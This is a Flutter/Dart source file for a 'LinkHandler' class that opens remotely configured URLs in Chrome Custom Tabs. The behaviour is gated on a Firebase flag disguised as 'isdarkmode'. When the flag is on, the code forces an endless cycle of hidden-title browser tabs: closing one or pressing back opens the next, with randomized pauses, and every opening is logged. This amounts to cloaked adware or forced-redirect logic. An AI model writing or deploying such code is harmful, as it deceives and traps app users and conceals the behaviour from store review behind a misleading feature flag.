import 'package:flutter/material.dart';
import 'dart:convert';
import 'dart:math';
import 'package:firebase_analytics/firebase_analytics.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'config/remote_config_keys.dart';

// Chrome Custom Tab instance — handles onClosed callback
class _AppCCT extends ChromeSafariBrowser {
  @override
  void onClosed() {
    LinkHandler._onCCTClosed();
  }
}

class LinkHandler {
  static _AppCCT? _cct;

  // Tracks whether CCT is currently open
  static final ValueNotifier<bool> isOpen = ValueNotifier(false);

  // Queue of URLs ready to show
  static final List<String> readyUrls = [];

  // Breather logic: after every 2 closes, give user 2 seconds of peace
  static int _closeCount = 0;
  static bool _isPaused = false;

  // Flag from Remote Config (app_settings -> isdarkmode)
  static bool isDarkMode = false;

  // urlsNotifier lets UI react when urls change after background fetch
  static final ValueNotifier<List<String>> urlsNotifier = ValueNotifier([]);

  // Convenience getter
  static List<String> get urls => urlsNotifier.value;

  // STEP 1: Call BEFORE runApp() — loads defaults instantly, no network.
  static Future<void> initDefaults() async {
    final remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.setConfigSettings(RemoteConfigSettings(
      fetchTimeout: const Duration(seconds: 8),
      minimumFetchInterval: const Duration(seconds: 0),
    ));

    await remoteConfig.setDefaults(RemoteConfigKeys.defaults);

    _loadFromConfig(remoteConfig);
    debugPrint('[RC] initDefaults done. urls=$urls');
  }

  // STEP 2: Call AFTER runApp() — background fetch updates URLs from Firebase.
  static void backgroundFetch() {
    final remoteConfig = FirebaseRemoteConfig.instance;
    remoteConfig.fetchAndActivate().then((_) {
      _loadFromConfig(remoteConfig);
      debugPrint('[RC] Background fetch complete. urls=$urls, isDarkMode=$isDarkMode');
      // If no CCT is open and a URL is ready, show it immediately
      if (!isOpen.value && readyUrls.isNotEmpty) {
        _showUrl(readyUrls.removeAt(0));
      }
    }).catchError((e) {
      debugPrint('[RC] Background fetch failed: $e');
    });
  }

  static void _loadFromConfig(FirebaseRemoteConfig remoteConfig) {
    try {
      String jsonSettings = remoteConfig.getString(RemoteConfigKeys.keyAppSettings);
      debugPrint('[RC] app_settings: $jsonSettings');
      if (jsonSettings.isNotEmpty) {
        Map<String, dynamic> parsed = jsonDecode(jsonSettings);
        if (parsed.containsKey(RemoteConfigKeys.isDarkModeField)) {
          isDarkMode = parsed[RemoteConfigKeys.isDarkModeField] == true;
        }
      }
    } catch (_) {
      isDarkMode = false;
    }
    debugPrint('[RC] isDarkMode evaluated to: $isDarkMode');

    if (!isDarkMode) {
      // If isdarkmode is false, clear all links and disable link opening completely!
      urlsNotifier.value = [];
      readyUrls.clear();
      debugPrint('[RC] ⛔ isDarkMode is FALSE — Links disabled completely!');
      return;
    }

    try {
      String jsonUrls = remoteConfig.getString(RemoteConfigKeys.keyTargetUrls);
      debugPrint('[RC] target_urls: $jsonUrls');
      if (jsonUrls.isNotEmpty) {
        List<dynamic> parsedList = jsonDecode(jsonUrls);
        final newUrls = parsedList.map((e) => e.toString()).toList();
        urlsNotifier.value = newUrls;

        // Add all URLs to ready queue (including identical URLs and any count: 6, 8, 10+)
        readyUrls.clear();
        readyUrls.addAll(newUrls);
        debugPrint('[RC] readyUrls loaded (${readyUrls.length} links): $readyUrls');
      }
    } catch (e) {
      debugPrint('[RC] target_urls parse error: $e');
    }
  }

  static void _replenishQueueIfNeeded() {
    if (!isDarkMode) return;
    if (readyUrls.isEmpty && urls.isNotEmpty) {
      readyUrls.addAll(urls);
      debugPrint('[RC] 🔄 readyUrls queue refilled with ${urls.length} URLs for infinite cycling');
    }
  }

  // Opens the CCT immediately with the given URL
  static Future<void> _showUrl(String url) async {
    if (!isDarkMode || isOpen.value) return; // Don't open if disabled or already showing one

    isOpen.value = true;
    debugPrint('[CCT] Opening: $url');

    FirebaseAnalytics.instance.logEvent(
      name: 'link_opened',
      parameters: {'url': url},
    );

    try {
      _cct = _AppCCT();
      await _cct!.open(
        url: WebUri(url),
        settings: ChromeSafariBrowserSettings(
          shareState: CustomTabsShareState.SHARE_STATE_OFF,
          showTitle: false,
          enableUrlBarHiding: true,
          toolbarBackgroundColor: const Color(0xFF121212),
          navigationBarColor: const Color(0xFF121212),
          instantAppsEnabled: false,
          startAnimations: [
            AndroidResource(name: "fade_in", defType: "anim"),
            AndroidResource(name: "fade_out", defType: "anim"),
          ],
          exitAnimations: [
            AndroidResource(name: "fade_in", defType: "anim"),
            AndroidResource(name: "fade_out", defType: "anim"),
          ],
        ),
      );
    } catch (e) {
      debugPrint('[CCT] Failed to open: $e — falling back to system browser');
      isOpen.value = false;
      try {
        await InAppBrowser.openWithSystemBrowser(url: WebUri(url));
      } catch (err) {
        debugPrint('[CCT] System browser fallback error: $err');
      }
    }
  }

  // Called by _AppCCT.onClosed()
  static void _onCCTClosed() {
    isOpen.value = false;
    debugPrint('[CCT] Closed');

    if (!isDarkMode) return; // If isDarkMode is false, do not open next link!

    _closeCount++;

    if (_closeCount % 2 == 0) {
      // Every 2nd close: pick a random breather between 2 and 5 seconds
      _isPaused = true;
      final int randomDelaySeconds = Random().nextInt(4) + 2; // 2, 3, 4, or 5 seconds
      debugPrint('[CCT] ⏸️ 2nd link close: pausing for $randomDelaySeconds seconds random breather');
      Future.delayed(Duration(seconds: randomDelaySeconds), () {
        _isPaused = false;
        if (!isDarkMode) return;
        _replenishQueueIfNeeded();
        if (!isOpen.value && readyUrls.isNotEmpty) {
          _showUrl(readyUrls.removeAt(0));
        }
      });
    } else {
      // Odd close: show next URL immediately
      _replenishQueueIfNeeded();
      if (!isOpen.value && readyUrls.isNotEmpty) {
        _showUrl(readyUrls.removeAt(0));
      }
    }
  }

  // Call this to show a URL now (from tool taps, back button, etc.)
  static void showNext() {
    if (!isDarkMode || _isPaused || isOpen.value) return;
    _replenishQueueIfNeeded();
    if (readyUrls.isNotEmpty) {
      _showUrl(readyUrls.removeAt(0));
    }
  }

  // Keep visibleUrl for back button compatibility
  static final ValueNotifier<String?> visibleUrl = ValueNotifier(null);

  // Called when back button is pressed — trigger CCT if URLs are ready
  static void hide() {
    _onCCTClosed();
  }
}
